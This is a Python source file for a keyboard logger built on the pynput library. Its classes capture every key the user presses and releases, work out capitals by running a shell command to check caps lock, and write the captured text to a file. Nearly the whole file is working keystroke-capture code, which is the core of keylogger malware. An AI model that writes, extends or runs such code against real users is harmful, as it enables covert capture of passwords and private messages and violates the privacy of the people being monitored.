import subprocess
import sys

from pynput import keyboard

from .file_manager import FileManagerWriteMode


class _KeyManager:
    """
    Manages pressed and released key by user.
    Finally, gets a string character
    """

    _SPECIAL_KEY_LIST = [
        keyboard.Key.alt,
        keyboard.Key.alt_gr,
        keyboard.Key.alt_l,
        keyboard.Key.alt_r,
        keyboard.Key.ctrl,
        keyboard.Key.ctrl_l,
        keyboard.Key.ctrl_r
    ]

    def __init__(self):
        self._caps_lock_on = False

    @staticmethod
    def _is_caps_lock_on():
        """
        Depending of the current os, checks if the caps lock is on or off
        :return:
        """
        if sys.platform.startswith("linux"):
            command = "xset q | grep Caps"
        elif sys.platform.startswith("win32") or sys.platform.startswith("cygwin"):
            command = ""
        else:
            command = ""

        command_result = subprocess.Popen(
            command,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            stdin=subprocess.PIPE
        )
        command_output = command_result.stdout.read()
        command_output = command_output[20:25].strip().lower()

        return command_output == b"on"

    @staticmethod
    def _replace_key_by_character(key):
        """
        For some keys, like Key.space, replaces it by the appropriate character.
        :return:
        """
        if key == keyboard.Key.space.__str__():
            return " "

        if key == keyboard.Key.caps_lock.__str__():
            return ""

        if key == keyboard.Key.enter.__str__():
            return "\n"

        return key

    def is_special_key(self, key):
        """
        Just checks if the given key is in the list of special key.
        :param key:
        :return:
        """
        return key in self._SPECIAL_KEY_LIST

    def get_character(self, key):
        """
        When user pressed or released a key, converts the key code in string.
        :param key:
        :return:
        """
        try:
            character = key.char
        except AttributeError:
            character = key

        character = self._replace_key_by_character(str(character))

        if self._is_caps_lock_on():
            self._caps_lock_on = True
        else:
            self._caps_lock_on = False

        if self._caps_lock_on:
            return character.upper()
        else:
            return character.lower()


class KeyboardListener:
    """
    Handler class for the pynput dependency control.
    Inspired by the module documentation.
    """

    def __init__(self, file_manager):
        """
        Initializes needed attributes for the listener.
        :param file_manager:
        """
        self._file_manager = file_manager
        self._key_manager = _KeyManager()

    def _on_press(self, key):
        """
        Acts only if the key is a special key.
        Prepares the character to write as more readable in file.
        :param key:
        :return:
        """
        if self._key_manager.is_special_key(key):
            character = self._key_manager.get_character(key)
            character = f"\n{character}+"

            self._file_manager.write(character, FileManagerWriteMode.OUTLINE)

    def _on_release(self, key):
        """
        Prepares the character to write depending if it is a special key or not.
        :param key:
        :return:
        """
        if key == keyboard.Key.esc:  # TODO: need remove after testing
            return False

        character = self._key_manager.get_character(key)

        if self._key_manager.is_special_key(key):
            self._file_manager.write("\n", FileManagerWriteMode.OUTLINE)
        else:
            self._file_manager.write(character)

    def start(self):
        """
        Just starts the listener.
        :return:
        """
        with keyboard.Listener(
            on_press=self._on_press,
            on_release=self._on_release
        ) as keyboard_listener:
            keyboard_listener.join()
